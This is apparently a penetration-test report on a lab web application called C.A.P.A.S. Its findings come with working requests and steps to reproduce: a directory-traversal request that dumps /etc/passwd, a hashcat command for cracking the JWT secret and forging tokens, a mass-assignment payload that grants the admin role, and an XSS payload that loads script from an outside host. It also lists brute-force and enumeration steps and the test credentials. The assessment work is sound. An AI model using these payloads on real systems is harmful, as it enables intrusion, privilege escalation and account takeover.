# Secuirty Assessment Report

## Table of Contents

- [Executive Summary](#executive-summary)
- [Scope of Assessment](#scope-of-assessment)


## Executive Summary

The objective of this assessment was to identify and evaluate potential security vulnerabilities within Cyber Attack Permission Application System web application. The engagement was conducted as a black-box security assessment, where testing was limited to the application's external interface without direct access to source code.

Throughout this assessment, particular emphasis was placed on vulnerabilities impacting the confidentiality, integrity, or availability of the application's data. Tests were carried out in alignment with widely recognized methodologies, including the [OWASP Top 10](https://owasp.org/API-Security/editions/2023/en/0x00-header/) and the [OWASP Application Security Verification Standard (ASVS)](https://raw.githubusercontent.com/OWASP/ASVS/v4.0.3/4.0/OWASP%20Application%20Security%20Verification%20Standard%204.0.3-en.pdf), as well as general security best practices.

A variety of tools, including nmap, dirsearch, Burp Suite, hashcat, and Visual Studio Code, were used to thoroughly investigate the application’s attack surface.

The results of the assessment reveal critical vulnerabilities impacting user privileges, input validation, session handling, and access controls. Each identified vulnerability has been documented with evidence, business impact, and reproducible steps. These findings aim to help enhance the security of the application, ultimately reducing potential exposure to malicious exploitation.


## Scope of Assessment

The scope of this security assessment focused on evaluating the security posture of a newly developed web application. The objectives were to identify potential vulnerabilities in the application’s user functionalities, backend services, and any accessible endpoints, prioritizing issues that could impact the confidentiality, integrity, or availability of user data.

Testing was conducted on a virtual machine (VM) environment accessible via the IP address configured by the assessor. The primary application endpoint was accessed at http://<your.vm.ip.address>:3001, and interactions with background services and APIs were explored within this environment.

| User Role      | Email                  | Password 
| :------------- | :--------------------  | :----------------------|
| Regular        | test1@silverskin.fi    | Test123!               |
| Reviewer       | test2@silverskin.fi    | Reviewingisboring:(0   |
| Admin          | test3@silverskin.fi    | I4m4admin----          |


## Detailed Findings 

#### Directory Traversal to Access Sensitive Files

##### Description
A directory traversal vulnerability was identified in the /v1/static/ path, where an attacker can exploit path manipulation techniques to access sensitive files outside the intended directory. Specifically, by crafting a request to the URL 
`http://192.168.72.128:3000/v1/static/\..\..\..\..\..\..\..\..\..\etc\passwd`,

the attacker was able to retrieve the contents of the /etc/passwd file, which contains sensitive information about user accounts on the server.

##### Severity 
High

##### Impact in Business Context
This vulnerability poses a significant security risk as it allows attackers to gain access to sensitive system files. The /etc/passwd file contains critical information about user accounts, including usernames, and system configuration details. If this file is exposed, attackers could potentially perform further enumeration, privilege escalation, or other attacks targeting system users. In the context of C.A.P.A.S., which handles sensitive attack submission details, this vulnerability could lead to unauthorized access to administrative credentials or system configurations, jeopardizing the confidentiality and integrity of user data.

###### Evidence
- Request
    ```json
    GET /v1/static/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
    Host: 192.168.72.128:3000
    ```

- Respone
    ```text
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
    landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    silver:x:1000:1000:Silverskin:/home/silver:/bin/bash
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    mongodb:x:113:117::/var/lib/mongodb:/usr/sbin/nologin
    fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
    ```

![etc-passwd-file](Evidence/etc-passwd-file.png)

##### Steps to reproduce
To reproduce the vulnerability, one has to perform the following steps.

1. Send the following HTTP request to the `/v1/static/` path:
    ```json
    GET /v1/static/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
    Host: [TARGET_IP]:3000
    ```
2. Review the response, which will display the contents of the /etc/passwd file.



#### Improper JWT Handling and Token Management

##### Description
The application’s handling of JSON Web Tokens (JWTs) has several critical flaws related to token secret management, expiration, and reuse, potentially allowing unauthorized access or persistent sessions. These issues undermine session security and could be exploited to escalate privileges, impersonate users, or maintain access indefinitely.

##### Severity
High

##### Impact in Business Context
The weakness in the handling of JWT tokens could allow an attacker to perform a variety of malicious actions, with critical implications for the integrity of the application. Since the JWT secret is weak, an attacker could forge or modify the token, especially the exp (expiration) field, to bypass token expiration mechanisms. This would allow the attacker to maintain session access beyond the intended period, granting them prolonged unauthorized access. Furthermore, the weak secret could enable attackers to generate their own tokens, effectively creating a backdoor to access resources that would otherwise be restricted. With the ability to craft their own tokens, an attacker could potentially gain access to sensitive information or perform unauthorized actions, such as accessing feedback or user data, or even performing privileged actions without legitimate authorization. This compromises both data confidentiality and the integrity of the application, making the vulnerability a critical concern for the business.

##### Evidence
- Cracking of JWT secret
![jwt-secret-cracking](Evidence/jwt-secret-cracking.png)

- Modified and signed token
![modified-token](Evidence/modified-token.png)

- Modified token in use
![modified-token-in-use](Evidence/modified-token-in-use.png)



##### Steps to Reproduce
To reproduce the vulnerability, one has to perform the following steps.

1. Log in to the application as a regular user, capture the JWT token issued upon login, and take note of its structure. You can use the credentials below:
    - email: test1@silverskin.fi
    - password: Test123!

2. Use Burp Suite or a similar tool to intercept the login request and capture the token.

3. Use a brute-force tool like `hashcat` to attempt cracking the JWT secret.

4. With hashcat, run the command:
    ```
    hashcat -a 0 -m 16500 <JWT-hash> <path-to-wordlist> 
    ```
    Use the specialized JWT wordlist from the repository at https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list.
    Once the secret is cracked, verify it by decoding the token with the recovered secret to confirm its validity.

5. With the cracked secret, use JWT Editor extension modify the payload with new values as desired.

6. Re-sign the token using the cracked secret to generate a valid signature.

7. Use the modified token in authenticated requests to see if the server accepts it without invalidating or logging out the session.



#### Mass Assignment Vulnerability in User Role Creation

##### Severity
Critical 

#### Description
The application’s `/v1/auth/register ` endpoint does not properly restrict which fields can be included in the registration request payload, allowing the assignment of sensitive fields such as `role`. This enabled the creation of a user with elevated privileges (admin role) by merely adding `"role": "admin"` to the registration payload.

#### Impact in Business Context
The vulnerability in the C.A.P.A.S. application allows an attacker to gain administrative privileges by exploiting mass assignment. Although administrators don't directly manage applications, they do have access to all user feedback, including detailed browser information that comes with each submission. This data can reveal sensitive details about the user's environment, such as their browser type, operating system, location, cookies, and other device-specific information. With admin access, an attacker could view all feedback from users and collect this information, potentially violating user privacy. This could allow the attacker to create targeted attacks or even track users across sessions. Moreover, by manipulating or deleting feedback, they could cover their tracks and disrupt the application’s review process. The ability to access such data compromises the security of both the application and its users, eroding trust in the platform and jeopardizing the integrity of the feedback system. This vulnerability could lead to misuse of the data, affecting users' security and privacy.

#### Evidence
- Request  

    ```json
    POST /v1/auth/register HTTP/1.1
    Content-Type: application/json
   

    {
        "name":"Mass assignment","
        email":"mass.assignment@silverskin.fi",
        "password":"test12345",
        "role":   "admin"
    }
    ```

- Respone
    ```json
    {
    "user": {
        "role": "admin",
        "isEmailVerified": false,
        "name": "Mass assignment",
        "email": "mass.assignment@silverskin.fi",
        "id": "672d0cff494d2a0490c36784"
    },
    "tokens": {
        "access": {
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2NzJkMGNmZjQ5NGQyYTA0OTBjMzY3ODQiLCJpYXQiOjE3MzEwMDU2OTUsImV4cCI6MTczMTAyMzY5NSwidHlwZSI6ImFjY2VzcyJ9.hEzZ40CmgX5qCfJjqlDpAvo15Kt6Q97VRMdvAgrjggA",
        "expires": "2024-11-07T23:54:55.968Z"
        },
        "refresh": {
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2NzJkMGNmZjQ5NGQyYTA0OTBjMzY3ODQiLCJpYXQiOjE3MzEwMDU2OTUsImV4cCI6MTczMzU5NzY5NSwidHlwZSI6InJlZnJlc2gifQ.yukWMsGRUZDvU-DJ4_1TYxkH7EAEDkFKppCRTAbFVkQ",
        "expires": "2024-12-07T18:54:55.969Z"
        }
    }
    }
    ```
![mass-assignment-user-role](Evidence/mass-assignment-user-role.png)

##### Steps to Reproduce
To reproduce the vulnerability, one has to perform the following steps. This request should create a new user account with a default role.

1. Using the application’s registration endpoint (e.g., /v1/auth/register), submit a registration request with basic account details (e.g., email, password). This request should create a new user account with a default role.

2. Use a proxy tool to intercept the HTTP request made to the registration endpoint.

3. In the intercepted request, locate the request payload. Add a `role` parameter and set its value to `admin` as shown below:
```json
{
  "email": "newuser@silverskin.fi",
  "password": "UserPassword123!",
  "role": "admin"
}
```

4. Forward the modified request with the added role parameter to the server.

5. Upon successful registration, log in using the newly created account. Confirm the account has been granted elevated privileges like checking available feedbacks.



#### Insecure Direct Object Reference (IDOR) / Insufficient Access Control

##### Description
The application allows authenticated users to modify the details of any application by knowing its unique application ID. When sending a PUT request to the endpoint `/v1/applications/me/{applicationId}`, the system does not perform adequate authorization checks to ensure that the user making the request is the owner of the application or has the necessary permissions to modify it. This could potentially allow unauthorized users to change the information of any application simply by knowing its ID. Additionally, users can modify critical fields such as `isEmailVerified` without proper validation, enabling them to bypass necessary email verification steps.

##### Severity
Critical

##### Impact in Business Context
This vulnerability undermines the core function of the C.A.P.A.S. system, which is designed to manage and safeguard sensitive application data associated with cyber attack permissions. Exploiting this vulnerability allows attackers to modify the details of any application, even if they are not the application’s owner. Such modifications could include altering target details, attack plans, security codes, and other sensitive information, effectively falsifying or corrupting the application process. For C.A.P.A.S., where the integrity and careful vetting of cyber attack applications are paramount, this could lead to misleading approvals or rejections, as modified applications may cause reviewers or administrators to approve, reject, or re-evaluate applications based on falsified data.

Additionally, attackers can exploit the ability to change the isEmailVerified field for other users, bypassing the verification step. This could allow unauthorized users to gain access to features or permissions that should only be granted to those with verified email addresses. The system's inability to validate email verification compromises the application’s security, as it could allow users to impersonate verified individuals, gaining unauthorized access to sensitive areas of the platform.

The credibility of C.A.P.A.S. as a trusted system could be severely compromised if users lose confidence in its ability to protect application data, maintain accurate permission-granting processes, and ensure that only legitimate users gain access to sensitive systems. This creates the risk of unintentionally granting permissions to unqualified or unintended parties, and exposes sensitive application data to potential exploitation. The vulnerability, if left unaddressed, could severely damage the integrity and confidentiality of cyber attack permission management and the overall trustworthiness of the system.


#### Evidence
- Modidification of an application created by a different user.
    ![IDOR-modified-approved-application](Evidence/IDOR-modified-approved-application.png)

- Modification of an application which has disabled edit on user inferface
    ![alt text](Evidence/IDOR-modification-of-approved-and-disabled-editing.png)


##### Steps to Reproduce
To reproduce the vulnerability, one has to perform the following steps.

1. Login with the credentials below and create a new applicaiton. Please note the application ID generated for this new entry down. By intercepting in Burp Suite or clicking the edit button that shows up on the newly created applicaiton.
    - email: test1@silverskin.fi
    - password: Test123!

2. Create another user account, either through registration or by using another test account if available.

3. Capture the request for updating an application as the first user and replace the application ID in the request with the application ID of the second user’s application.

4. Submit the modified request. Observe that changes made by the first user are applied to the second user’s application, confirming unauthorized modification capability.



#### Reflected Cross-Site Scripting (XSS) Leading to Denial of Service (DoS)

##### Descritpion
A reflected Cross-Site Scripting (XSS) vulnerability was identified in the /feedback endpoint, which allows attackers to inject arbitrary JavaScript code into the application. When an attacker submits feedback containing malicious script tags, these are reflected back in the response, causing the admin interface to break. During testing, a malicious payload was submitted in the feedback field, which resulted in a 500 Internal Server Error or JSON parsing error. The error occurred when the admin tried to view the feedback data, indicating that the injected script corrupted the JSON response, effectively causing a Denial of Service (DoS) for administrators attempting to view feedback entries.

##### Severity
High

##### Impact in Business Context
This vulnerability can disrupt administrative operations by causing a denial of service on the feedback interface. Since administrators are responsible for reviewing feedback that could influence security decisions, the ability to inject arbitrary scripts and cause errors in the admin view directly impacts their ability to review critical user feedback. This could result in delays in responding to application vulnerabilities, missed security threats, and a deterioration of operational trust in the system. Additionally, this flaw might be exploited for further attacks, potentially leading to more severe consequences like remote code execution in the future.

##### Evidence
- Request
    ```json
    POST /v1/feedback HTTP/1.1
    Host: 192.168.72.128:3000
    Content-Length: 1278
    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2MWY3YTMzOTkyYWU4MmU5MDNjYTVmM2EiLCJpYXQiOjE3MzA5OTcyODksImV4cCI6NDEwMjQ0NDgwMCwidHlwZSI6ImFjY2VzcyJ9.dTMDHIyLoek1Jlj7eiRcye38M5TMrPclxRulsiCgQBE
    Content-Type: application/json

    {
        "message":<SCRIPT/XSS SRC='http://xss.rocks/xss.js'></SCRIPT>,
        "browserDataJSON":"{\"vendorSub\":\"\\\"\\\"\",\"productSub\":\"\\\"20030107\\\"\",\"vendor\":\"\\\"Google Inc.\\\"\",\"maxTouchPoints\":\"10\",\"scheduling\":\"{}\",\"userActivation\":\"{}\",\"doNotTrack\":\"null\",\"geolocation\":\"{}\",\"connection\":\"{}\",\"plugins\":\"{\\\"0\\\":{\\\"0\\\":{}},\\\"1\\\":{\\\"0\\\":{}}}\",\"mimeTypes\":\"{\\\"0\\\":{},\\\"1\\\":{}}\",\"pdfViewerEnabled\":\"true\",\"webkitTemporaryStorage\":\"{}\",\"webkitPersistentStorage\":\"{}\",\"windowControlsOverlay\":\"{}\",\"hardwareConcurrency\":\"8\",\"cookieEnabled\":\"true\",\"appCodeName\":\"\\\"Mozilla\\\"\",\"appName\":\"\\\"Netscape\\\"\",\"appVersion\":\"\\\"5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\\\"\",\"platform\":\"\\\"Win32\\\"\",\"product\":\"\\\"Gecko\\\"\",\"userAgent\":\"\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\\\"\",\"language\":\"\\\"en-US\\\"\",\"languages\":\"[\\\"en-US\\\"]\",\"onLine\":\"true\",\"webdriver\":\"false\",\"ink\":\"{}\",\"mediaCapabilities\":\"{}\",\"mediaSession\":\"{}\",\"permissions\":\"{<IMG SRC=# onmouseover=\"alert('xxs')\">}\"}"
    }
    ```

- Response
    ```json
    {
        "code":500,
        "message":"Internal Server Error",
        "stack":"SyntaxError: Unexpected token < in JSON at position 11\n    at JSON.parse (<anonymous>)\n    at parse (/home/silver/demoapp/demoapp-backend/node_modules/body-parser/lib/types/json.js:89:19)\n    at /home/silver/demoapp/demoapp-backend/node_modules/body-parser/lib/read.js:121:18\n    at invokeCallback (/home/silver/demoapp/demoapp-backend/node_modules/raw-body/index.js:224:16)\n    at done (/home/silver/demoapp/demoapp-backend/node_modules/raw-body/index.js:213:7)\n    at IncomingMessage.onEnd (/home/silver/demoapp/demoapp-backend/node_modules/raw-body/index.js:273:7)\n    at IncomingMessage.emit (events.js:203:15)\n    at endReadableNT (_stream_readable.js:1145:12)\n    at process._tickCallback (internal/process/next_tick.js:63:19)"
    }
    ```

![DoS-for-admin-on-feedback-path](Evidence/DoS-for-admin-on-feedback-path.png)

##### Steps to Reproduce
To reproduce the vulnerability, one has to perform the following steps.

1. Log in to the application as a regular user using valid credentials. 
    - email: test1@silverskin.fi
    - password: Test123!

2. Once logged in , navigate to the `feedback` page. Submit feedback with normal content.

3. Use Burp Suite to intercept the HTTP request containing the feedback submission. 

4. In the intercepted request, modify the feedback content with the following payload.
    ```json
    {
        "message":<SCRIPT/XSS SRC='http://xss.rocks/xss.js'></SCRIPT>,
        "browserDataJSON":"{\"vendorSub\":\"\\\"\\\"\",\"productSub\":\"\\\"20030107\\\"\",\"vendor\":\"\\\"Google Inc.\\\"\",\"maxTouchPoints\":\"10\",\"scheduling\":\"{}\",\"userActivation\":\"{}\",\"doNotTrack\":\"null\",\"geolocation\":\"{}\",\"connection\":\"{}\",\"plugins\":\"{\\\"0\\\":{\\\"0\\\":{}},\\\"1\\\":{\\\"0\\\":{}}}\",\"mimeTypes\":\"{\\\"0\\\":{},\\\"1\\\":{}}\",\"pdfViewerEnabled\":\"true\",\"webkitTemporaryStorage\":\"{}\",\"webkitPersistentStorage\":\"{}\",\"windowControlsOverlay\":\"{}\",\"hardwareConcurrency\":\"8\",\"cookieEnabled\":\"true\",\"appCodeName\":\"\\\"Mozilla\\\"\",\"appName\":\"\\\"Netscape\\\"\",\"appVersion\":\"\\\"5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\\\"\",\"platform\":\"\\\"Win32\\\"\",\"product\":\"\\\"Gecko\\\"\",\"userAgent\":\"\\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\\\"\",\"language\":\"\\\"en-US\\\"\",\"languages\":\"[\\\"en-US\\\"]\",\"onLine\":\"true\",\"webdriver\":\"false\",\"ink\":\"{}\",\"mediaCapabilities\":\"{}\",\"mediaSession\":\"{}\",\"permissions\":\"{<IMG SRC=# onmouseover=\"alert('xxs')\">}\"}"
    }
    ```

5. Forward the modified request ot the server.

6. The server responds with a 500 Internal Server Error, indicating a possible vulnerability due to improper handling of the payload.

7. Navigate back to the web app and log in with admin credentials:
    - email: test3@silverskin.fi
    - password: I4m4admin----

8. As an admin, navigate to the feedback page.

9. The admin interface throws an Unhandled Rejection (syntax error), caused by the modified feedback content, disrupting the feedback display functionality.


#### User Enumeration vai Password Reset

##### Description
The `/v1/auth/forgot-password` path allows attackers to determine whether specific email addresses exist within the application by observing distinct HTTP status codes returned for valid and invalid email addresses. When submitting an invalid email through this endpoint, the application returns a 404 Not Found status, explicitly indicating that no user is associated with that email. For valid email addresses, the application instead returns a 500 Internal Server Error, revealing a misconfigured email service but confirming the account's existence. This difference in response enables attackers to enumerate valid user accounts by testing various email addresses and analyzing the responses.

##### Severity 
Medium

# Impact in Business Context
- Attackers can exploit this vulnerability to confirm the existence of user accounts. By probing the forgot-password path with different email addresses, an attacker can compile a list of valid user accounts in the system. This information can later be used to facilitate targeted attacks, such as phishing or credential stuffing.

##### Evidence
- Non-existing account
![user-enumeration-vai-forgot-pasasword-non-existing-account](Evidence/user-enumeration-vai-forgot-pasasword-non-existing-account.png)

- Existing account
![user-enumeration-via-forgot-password-existing-account](Evidence/user-enumeration-via-forgot-password-existing-account.png)

##### Steps to Reproduce
To reproduce the vulnerability, one has to perform the following steps.

1. Open your browser and navigate to the api docs for the application (http://your.vm.ip.address:3000/v1/docs). 

2. In the API docs, locate the endpoint related to forgot password (`/v1/auth/forgot-password`), input a sample email (e.g., test1@silverskin.fi), and execute the request.

3. Capture the request in Burp Suite

4. Send the captured request to Intruder, set the email field as a payload position, and load a list of similar email patterns based on observed naming conventions (e.g., test2@silverskin.fi, test3@silverskin.fi, etc.).

5. Start the Intruder attack and review the responses. Look for variations indicating whether an account exists, such as “Internal Server Error” vs. “No users found with this email.”



#### Verbose Error Handling in Authentication Endpoint

##### Description
The `/v1/me` endpoint returns an overly detailed error message when accessed without authentication. 
This message includes information about the application’s authentication process, specific 
internal paths, and function calls. This could help an attacker better understand the 
application’s structure and authentication mechanism.

##### Severity 
Low

##### Impact in Business Context
 Attackers could use this information to gather insights into the backend system and potentially exploit other vulnerabilities to compromise the platform. With knowledge of internal error details, an attacker may be able to craft more precise attacks, targeting weak points in authentication or other areas of the application.

##### Evidence
- Request:

    ```
    GET /v1/me HTTP/1.1
    Host: 192.168.72.128:3000
    ```
- Response
      
    ```json
    {
        "code":401,
        "message":"Please authenticate",
        "stack":"Error: Please authenticate\n    at /home/silver/demoapp/demoapp-backend/src/middlewares/auth.js:8:19\n    at allFailed (/home/silver/demoapp/demoapp-backend/node_modules/passport/lib/middleware/authenticate.js:107:18)\n    at attempt (/home/silver/demoapp/demoapp-backend/node_modules/passport/lib/middleware/authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (/home/silver/demoapp/demoapp-backend/node_modules/passport/lib/middleware/authenticate.js:302:9)\n    at JwtStrategy.authenticate (/home/silver/demoapp/demoapp-backend/node_modules/passport-jwt/lib/strategy.js:96:21)\n    at attempt (/home/silver/demoapp/demoapp-backend/node_modules/passport/lib/middleware/authenticate.js:366:16)\n    at authenticate (/home/silver/demoapp/demoapp-backend/node_modules/passport/lib/middleware/authenticate.js:367:7)\n    at Promise (/home/silver/demoapp/demoapp-backend/src/middlewares/auth.js:34:107)\n    at new Promise (<anonymous>)\n    at /home/silver/demoapp/demoapp-backend/src/middlewares/auth.js:33:10\n    at Layer.handle [as handle_request] (/home/silver/demoapp/demoapp-backend/node_modules/express/lib/router/layer.js:95:5)\n    at next (/home/silver/demoapp/demoapp-backend/node_modules/express/lib/router/route.js:137:13)\n    at Route.dispatch (/home/silver/demoapp/demoapp-backend/node_modules/express/lib/router/route.js:112:3)\n    at Layer.handle [as handle_request] (/home/silver/demoapp/demoapp-backend/node_modules/express/lib/router/layer.js:95:5)\n    at /home/silver/demoapp/demoapp-backend/node_modules/express/lib/router/index.js:281:22\n    at Function.process_params (/home/silver/demoapp/demoapp-backend/node_modules/express/lib/router/index.js:335:12)"
    }
    ```

![alt text](Evidence/verbose-error-handling-authentication.png)


##### Steps to Reproduce
To reproduce the vulnerability, one has to perform the following steps.
1. Attempt to access the /v1/me endpoint without providing any authentication credentials.
2. Observe the error message returned by the application, noting that it contains detailed information about the application's internal paths and function calls.
3. This behavior can be reproduced consistently without any specific payloads or authentication details.

### Denial of Service and Fault Injection

####  Cross-Origin Resource Sharing (CORS) Misconfiguration

##### Description
The application improperly trusts arbitrary origins due to a misconfigured CORS policy. Specifically, it allows requests from any origin by setting the Access-Control-Allow-Origin header to *, which can lead to unauthorized access and data leakage. This was demonstrated by sending a POST request with the Origin header set to `http://example.com`, and the server accepted it without validation.

##### Severity
Medium

##### Impact
An attacker could exploit this vulnerability to perform unauthorized actions on behalf of authenticated users. For example, if a user is logged into the application, an attacker could create a malicious website that makes requests to the vulnerable API, potentially accessing sensitive user data or performing actions like account modifications without the user's consent. This could lead to data theft, account takeover, and significant reputational damage to the organization.

##### Evidence
- Request 

    ```json
    POST /v1/auth/login HTTP/1.1
    Host: 192.168.72.128:3000
    Origin: http://example.com
    

    {
        "email":"test1@silverskin.fi",
        "password":"Test123!"
    }
    ```

- Response
    ```json
    {
        "user":{
            "role":"user",
            "isEmailVerified":true,
            "name":"Mr. Robot",
            "email":"test1@silverskin.fi",
            "id":"61f7a23292ae82e903ca5f15"
            },
        "tokens":{
            "access":{
                "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2MWY3YTIzMjkyYWU4MmU5MDNjYTVmMTUiLCJpYXQiOjE3MzA5OTU4NjUsImV4cCI6MTczMTAxMzg2NSwidHlwZSI6ImFjY2VzcyJ9.-Dz5nsTQg7gNASNeKlBSqE2up08orUrpC3HKVURkGXA",
                "expires":"2024-11-07T21:11:05.038Z"
                },
            "refresh":{
                "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2MWY3YTIzMjkyYWU4MmU5MDNjYTVmMTUiLCJpYXQiOjE3MzA5OTU4NjUsImV4cCI6MTczMzU4Nzg2NSwidHlwZSI6InJlZnJlc2gifQ.1qA0Gc6xxjff2JzHNjVQ7Ud2wguJDIrF7gYtKcCcZvI",
                "expires":"2024-12-07T16:11:05.038Z"
                }
            }
    }
    ```

![alt text](<Evidence/cross-orgin-sharing - arbitrary-origin-trusted.png>)

##### Steps to Reproduce
To reproduce the vulnerability, one has to perform the following steps.

1. Ensure that the application is running and accessible. Open your web browser and navigate to the login page of the application.

2. Attempt to login using the following credentials:
    - email: test1@silverskin.fi 
    - password: Test123!


    This action will trigger a request to /v1/auth/login.

2. Intercept the login request using a proxy tool to inspect the HTTP request details.

3. In the captured request, locate the Origin header (if absent, add it manually). Set the Origin header to a different domain, for example:

   ```text
   Origin: http://example.com
   ```

4. Forward the modified request to the server and observe the response.

10. Confirm that the server responds with sensitive user information, indicating that the server does not correctly validate the origin of the request, thus trusting the modified origin.


#### Lack of Brute-Force Protection on Authentication Endpoints

##### Description

The C.A.P.A.S. application lacks protections against brute-force attacks on its login endpoints, allowing attackers to make numerous authentication attempts without restrictions. During testing, a brute-force attack was simulated on a user account, attempting around 263 login attempts without encountering any CAPTCHA, account lockout, or rate-limiting defenses. As a result, the password was successfully cracked, demonstrating the ease with which an attacker could bypass weak passwords and gain unauthorized access to user accounts.

##### Severity
Medium

##### Impact in Business Context
This vulnerability poses a significant security risk to the application and its users. The lack of rate-limiting means that attackers can conduct password guessing attacks at scale, potentially gaining unauthorized access to sensitive user accounts. Since many users might use weak or reused passwords, this vulnerability increases the likelihood of successful unauthorized access. Once an attacker gains access to an account, they can misuse it for malicious activities, such as accessing sensitive data, performing unauthorized actions, or impersonating legitimate users. In the context of the application, where users can submit attack requests with sensitive details, unauthorized access could lead to severe consequences, including data breaches or system compromise. Additionally, this vulnerability could be exploited for lateral movement within the application, especially if an attacker is able to access an administrative account.

##### Evidence
- Cracked Password
![weak-password-cracking](Evidence/weak-password-cracking.png)

##### Steps to Reproduce

1. Using the given email address below, attem to log in using a common password list or try random passwords for a number of times.
    - email: test1@silverskin.fi

2. Observe that the system allows many consecutive login attempts without any account lockout or CAPTCHA challenge, making it possible to brute force the password of the account.

3. After a sufficient number of attempts, you will successfully crack the password and gain unauthorized access.



#### Insecure Access Control to Admin Resource

##### Description
The `/service-dashboard` endpoint, which is intended to be restricted to admins only, can be accessed by users with regular and reviewer roles. This issue stems from insufficient access controls in the application, where authorization checks are either missing or improperly configured for the /service-dashboard. Regular users and reviewers can access this path directly by navigating to it, despite the fact that it is supposed to be restricted to admins who are responsible for viewing sensitive job details and managing the system's overall operations.

##### Severity
Low

##### Impact in Business Context
While the `/service-dashboard` path does not expose highly sensitive data, its availability to unauthorized users could lead to the unintended exposure of operational details, such as job statuses and internal processes. In the context of the C.A.P.A.S. application, this could give lower-privilege users insights into system operations that were not intended for their access. This may not directly compromise confidentiality or integrity but undermines the principle of least privilege by allowing users to view pages designated for higher-privilege roles. The broader impact includes the potential for confusion or misinterpretation of system operations by users who may not have the context or permission to view such information. This vulnerability highlights the need for more robust access controls to ensure that users only see what they are authorized to view, upholding the system's integrity and trustworthiness.

#### Evidence
- Service dashboard accessed by lower privilege user
![service-dashboard-accessed-by-lower-privilege-user](Evidence/service-dashboard-accessed-by-lower-privilege-user.png)

##### Steps to Reproduce
To reproduce the vulnerability, one has to perform the following steps.

1. Login to the app with the credentials below:
    - email: test1@silverskin.fi
    - password: Test123!

2. After logging in, manually navigate to the `/service-dashboard` endpoint in the URL

3. Observe that, as a regular user, you are able to access a page that is not available from the home page or intended for your role.


#### Weak Application ID Enumeration – Predictable Application ID

##### Descritpion
The application uses a predictable and sequential pattern for application IDs, which can be easily enumerated by an attacker. This vulnerability occurs because the structure of the application ID is not randomized or obfuscated, allowing users to guess the IDs of other users' applications simply by modifying a part of the URL or request payload. Attackers can exploit this weakness to gain unauthorized access to or modify application data that belongs to other users.

##### Severity
Medium

##### Impact in Business Context
In the C.A.P.A.S. system, which deals with sensitive data surrounding cyber attack permissions, the ability to enumerate application IDs poses a risk to data integrity. While the system doesn't necessarily expose highly sensitive information directly through these application IDs, an attacker could exploit this flaw to alter application details, such as attack targets or methodologies, by modifying the application ID in requests. This could mislead reviewers and administrators into approving or rejecting applications based on falsified data, ultimately compromising the reliability and accuracy of the system's decision-making process.

Though the vulnerability doesn’t expose major data breaches, its exploitation could lead to misuse of the system, such as altering legitimate application details to create backdoors or grant unauthorized privileges. It could also affect the trust in C.A.P.A.S., as users and administrators may no longer be confident in the application’s ability to properly protect sensitive application data from manipulation. This could undermine the integrity of the cyber attack permission process and create openings for further malicious activity.

##### Evidence
- Application ID enumeration in Burp Intruder
![application-id-enumeration](Evidence/application-id-enumeration.png)


##### Steps to Reproduce
1. Login in with the provided user account below:
    - email: test1@silverskin.fi
    - password: Test123!

2. Create several applications within the platform.

3. Intercept the request for one of the applications using Burp Suite’s Proxy, and send it to Burp Intruder for further analysis.

